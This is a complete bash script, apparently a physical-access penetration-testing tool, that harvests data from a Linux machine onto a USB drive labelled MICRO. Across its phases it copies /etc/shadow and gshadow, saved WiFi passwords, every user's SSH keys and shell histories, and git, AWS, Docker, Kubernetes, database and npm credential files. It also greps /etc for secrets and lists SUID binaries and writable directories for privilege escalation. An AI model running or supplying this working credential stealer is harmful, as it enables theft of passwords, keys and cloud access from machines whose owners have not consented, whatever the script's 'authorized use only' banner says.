#!/bin/bash
# ============================================================================
#  FLLC - Linux Data Collector
#  Authorized Penetration Testing - Physical Access Engagement
#
#  Collects system info, network config, credentials, and artifacts
#  from a Linux target. All data saved to the mounted data dump drive.
#
#  AUTHORIZED USE ONLY - Requires explicit written permission.
#  FLLC
# ============================================================================

set +e  # Don't exit on errors

# ============================================================================
#  CONFIGURATION
# ============================================================================

# Auto-detect mount point (look for MICRO labeled drive, or use script location)
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
DRIVE=""

# Try to find the MICRO drive
for mount in /media/*/MICRO /mnt/MICRO /run/media/*/MICRO; do
    if [ -d "$mount" ]; then
        DRIVE="$mount"
        break
    fi
done

# Fallback to script directory's drive
if [ -z "$DRIVE" ]; then
    DRIVE="$SCRIPT_DIR"
fi

TIMESTAMP=$(date +%Y%m%d_%H%M%S)
HOSTNAME=$(hostname 2>/dev/null || echo "unknown")
USERNAME=$(whoami 2>/dev/null || echo "unknown")
OUT="$DRIVE/collected/${HOSTNAME}_${TIMESTAMP}"

# Create output structure
for dir in system network users credentials documents software; do
    mkdir -p "$OUT/$dir"
done

LOG="$OUT/collection.log"

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG"
}

log "=== FLLC DATA COLLECTION STARTED ==="
log "Target: $HOSTNAME"
log "User: $USERNAME"
log "Output: $OUT"

IS_ROOT=false
if [ "$(id -u)" -eq 0 ]; then
    IS_ROOT=true
fi

# ============================================================================
#  PHASE 1: SYSTEM INFORMATION
# ============================================================================

log "PHASE 1: System Information"

# Basic system info
cat > "$OUT/system/systeminfo.txt" << SYSEOF
Hostname:     $HOSTNAME
Username:     $USERNAME
UID:          $(id -u)
GID:          $(id -g)
Groups:       $(id -Gn 2>/dev/null)
Kernel:       $(uname -a 2>/dev/null)
Distro:       $(cat /etc/os-release 2>/dev/null | head -5)
Uptime:       $(uptime 2>/dev/null)
Date:         $(date)
Root:         $IS_ROOT
SYSEOF

# Full system details
uname -a > "$OUT/system/uname.txt" 2>/dev/null
cat /etc/os-release > "$OUT/system/os_release.txt" 2>/dev/null
cat /etc/issue > "$OUT/system/issue.txt" 2>/dev/null
cat /proc/version > "$OUT/system/proc_version.txt" 2>/dev/null
cat /proc/cpuinfo > "$OUT/system/cpuinfo.txt" 2>/dev/null
cat /proc/meminfo > "$OUT/system/meminfo.txt" 2>/dev/null
df -h > "$OUT/system/disk_usage.txt" 2>/dev/null
lsblk > "$OUT/system/block_devices.txt" 2>/dev/null
mount > "$OUT/system/mounts.txt" 2>/dev/null
lsusb > "$OUT/system/usb_devices.txt" 2>/dev/null
lspci > "$OUT/system/pci_devices.txt" 2>/dev/null
env > "$OUT/system/environment.txt" 2>/dev/null

# Running processes
ps auxf > "$OUT/system/processes.txt" 2>/dev/null

# Services
systemctl list-units --type=service --all > "$OUT/system/services_systemd.txt" 2>/dev/null
service --status-all > "$OUT/system/services_sysv.txt" 2>/dev/null

# Kernel modules
lsmod > "$OUT/system/kernel_modules.txt" 2>/dev/null

log "  System info collected"

# ============================================================================
#  PHASE 2: NETWORK INFORMATION
# ============================================================================

log "PHASE 2: Network Information"

ip addr > "$OUT/network/ip_addr.txt" 2>/dev/null
ifconfig -a > "$OUT/network/ifconfig.txt" 2>/dev/null
ip route > "$OUT/network/routes.txt" 2>/dev/null
ip neigh > "$OUT/network/arp.txt" 2>/dev/null
arp -a > "$OUT/network/arp_table.txt" 2>/dev/null
ss -tlnp > "$OUT/network/listening_ports.txt" 2>/dev/null
netstat -tlnp > "$OUT/network/netstat.txt" 2>/dev/null
netstat -ano > "$OUT/network/netstat_all.txt" 2>/dev/null
cat /etc/resolv.conf > "$OUT/network/resolv_conf.txt" 2>/dev/null
cat /etc/hosts > "$OUT/network/hosts.txt" 2>/dev/null
iptables -L -n -v > "$OUT/network/iptables.txt" 2>/dev/null
ip6tables -L -n -v > "$OUT/network/ip6tables.txt" 2>/dev/null

# WiFi
iwconfig > "$OUT/network/iwconfig.txt" 2>/dev/null
nmcli dev wifi list > "$OUT/network/wifi_networks.txt" 2>/dev/null
nmcli connection show > "$OUT/network/nm_connections.txt" 2>/dev/null

# WiFi saved passwords
if [ -d /etc/NetworkManager/system-connections ]; then
    mkdir -p "$OUT/network/wifi_saved"
    cp /etc/NetworkManager/system-connections/* "$OUT/network/wifi_saved/" 2>/dev/null
fi

# DNS
cat /etc/nsswitch.conf > "$OUT/network/nsswitch.txt" 2>/dev/null

log "  Network info collected"

# ============================================================================
#  PHASE 3: USER INFORMATION
# ============================================================================

log "PHASE 3: User Information"

id > "$OUT/users/current_user.txt" 2>/dev/null
cat /etc/passwd > "$OUT/users/passwd.txt" 2>/dev/null
cat /etc/group > "$OUT/users/group.txt" 2>/dev/null
w > "$OUT/users/logged_in.txt" 2>/dev/null
last -20 > "$OUT/users/last_logins.txt" 2>/dev/null
lastlog > "$OUT/users/lastlog.txt" 2>/dev/null

# Shadow file (requires root)
if [ "$IS_ROOT" = true ]; then
    cat /etc/shadow > "$OUT/users/shadow.txt" 2>/dev/null
    cat /etc/gshadow > "$OUT/users/gshadow.txt" 2>/dev/null
    log "  Shadow files copied (root)"
fi

# Sudoers
cat /etc/sudoers > "$OUT/users/sudoers.txt" 2>/dev/null
ls -la /etc/sudoers.d/ > "$OUT/users/sudoers_d.txt" 2>/dev/null

log "  User info collected"

# ============================================================================
#  PHASE 4: CREDENTIALS & SSH
# ============================================================================

log "PHASE 4: Credentials & SSH"

# SSH keys and config for all users
for homedir in /home/* /root; do
    if [ -d "$homedir" ]; then
        user=$(basename "$homedir")
        mkdir -p "$OUT/credentials/ssh_$user"

        # SSH keys
        if [ -d "$homedir/.ssh" ]; then
            cp -r "$homedir/.ssh/" "$OUT/credentials/ssh_$user/" 2>/dev/null
        fi

        # Bash history
        for hist in .bash_history .zsh_history .history .sh_history; do
            if [ -f "$homedir/$hist" ]; then
                cp "$homedir/$hist" "$OUT/credentials/${user}_${hist}" 2>/dev/null
            fi
        done

        # Git credentials
        if [ -f "$homedir/.git-credentials" ]; then
            cp "$homedir/.git-credentials" "$OUT/credentials/${user}_git_credentials" 2>/dev/null
        fi
        if [ -f "$homedir/.gitconfig" ]; then
            cp "$homedir/.gitconfig" "$OUT/credentials/${user}_gitconfig" 2>/dev/null
        fi

        # AWS credentials
        if [ -d "$homedir/.aws" ]; then
            cp -r "$homedir/.aws" "$OUT/credentials/${user}_aws/" 2>/dev/null
        fi

        # Docker config
        if [ -f "$homedir/.docker/config.json" ]; then
            mkdir -p "$OUT/credentials/${user}_docker"
            cp "$homedir/.docker/config.json" "$OUT/credentials/${user}_docker/" 2>/dev/null
        fi

        # Kube config
        if [ -f "$homedir/.kube/config" ]; then
            mkdir -p "$OUT/credentials/${user}_kube"
            cp "$homedir/.kube/config" "$OUT/credentials/${user}_kube/" 2>/dev/null
        fi

        # Various config files with potential creds
        for f in .netrc .my.cnf .pgpass .env .npmrc .pypirc; do
            if [ -f "$homedir/$f" ]; then
                cp "$homedir/$f" "$OUT/credentials/${user}_${f}" 2>/dev/null
            fi
        done
    fi
done

# SSHD config
cp /etc/ssh/sshd_config "$OUT/credentials/sshd_config.txt" 2>/dev/null

log "  Credentials & SSH collected"

# ============================================================================
#  PHASE 5: CRON JOBS
# ============================================================================

log "PHASE 5: Cron Jobs"

crontab -l > "$OUT/system/crontab_current.txt" 2>/dev/null
ls -la /etc/cron* > "$OUT/system/cron_dirs.txt" 2>/dev/null
cat /etc/crontab > "$OUT/system/crontab_system.txt" 2>/dev/null

for crondir in /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly; do
    if [ -d "$crondir" ]; then
        for f in "$crondir"/*; do
            if [ -f "$f" ]; then
                echo "=== $f ===" >> "$OUT/system/cron_scripts.txt"
                cat "$f" >> "$OUT/system/cron_scripts.txt" 2>/dev/null
                echo "" >> "$OUT/system/cron_scripts.txt"
            fi
        done
    fi
done

# User crontabs
if [ -d /var/spool/cron/crontabs ]; then
    cp -r /var/spool/cron/crontabs "$OUT/system/user_crontabs/" 2>/dev/null
fi

log "  Cron jobs collected"

# ============================================================================
#  PHASE 6: SOFTWARE & PACKAGES
# ============================================================================

log "PHASE 6: Software & Packages"

# Debian/Ubuntu
dpkg -l > "$OUT/software/dpkg_list.txt" 2>/dev/null
apt list --installed > "$OUT/software/apt_installed.txt" 2>/dev/null

# RHEL/CentOS/Fedora
rpm -qa > "$OUT/software/rpm_list.txt" 2>/dev/null
yum list installed > "$OUT/software/yum_installed.txt" 2>/dev/null

# Arch
pacman -Q > "$OUT/software/pacman_list.txt" 2>/dev/null

# Snap/Flatpak
snap list > "$OUT/software/snap_list.txt" 2>/dev/null
flatpak list > "$OUT/software/flatpak_list.txt" 2>/dev/null

# Python/pip
pip list > "$OUT/software/pip_list.txt" 2>/dev/null
pip3 list > "$OUT/software/pip3_list.txt" 2>/dev/null

# Node
npm list -g > "$OUT/software/npm_global.txt" 2>/dev/null

# SUID binaries (potential privesc)
find / -perm -4000 -type f > "$OUT/software/suid_binaries.txt" 2>/dev/null

# Writable directories
find / -writable -type d -maxdepth 3 > "$OUT/software/writable_dirs.txt" 2>/dev/null

log "  Software inventory collected"

# ============================================================================
#  PHASE 7: DOCUMENTS & FILES
# ============================================================================

log "PHASE 7: Documents & Files"

for homedir in /home/* /root; do
    if [ -d "$homedir" ]; then
        user=$(basename "$homedir")
        # Desktop
        if [ -d "$homedir/Desktop" ]; then
            find "$homedir/Desktop" -type f -maxdepth 2 > "$OUT/documents/${user}_desktop.txt" 2>/dev/null
        fi
        # Documents
        if [ -d "$homedir/Documents" ]; then
            find "$homedir/Documents" -type f -maxdepth 3 > "$OUT/documents/${user}_documents.txt" 2>/dev/null
        fi
        # Downloads
        if [ -d "$homedir/Downloads" ]; then
            find "$homedir/Downloads" -type f -maxdepth 2 > "$OUT/documents/${user}_downloads.txt" 2>/dev/null
        fi
    fi
done

# Interesting files
find /tmp /var/tmp /dev/shm -type f -maxdepth 2 > "$OUT/documents/temp_files.txt" 2>/dev/null

# Config files with potential secrets
grep -rl "password\|passwd\|secret\|key\|token\|api_key" /etc/ > "$OUT/documents/config_with_secrets.txt" 2>/dev/null

log "  Documents & files collected"

# ============================================================================
#  FINALIZE
# ============================================================================

log "=== COLLECTION COMPLETE ==="

FILE_COUNT=$(find "$OUT" -type f | wc -l)
TOTAL_SIZE=$(du -sh "$OUT" 2>/dev/null | cut -f1)

cat > "$OUT/SUMMARY.txt" << EOF
============================================
FLLC - DATA COLLECTION SUMMARY
============================================
Target:      $HOSTNAME
User:        $USERNAME
Root:        $IS_ROOT
Timestamp:   $TIMESTAMP
Files:       $FILE_COUNT
Total Size:  $TOTAL_SIZE
Output:      $OUT
============================================
EOF

echo ""
echo "============================================"
echo " FLLC - COLLECTION COMPLETE"
echo "============================================"
echo " Target:    $HOSTNAME"
echo " Files:     $FILE_COUNT"
echo " Size:      $TOTAL_SIZE"
echo " Output:    $OUT"
echo "============================================"
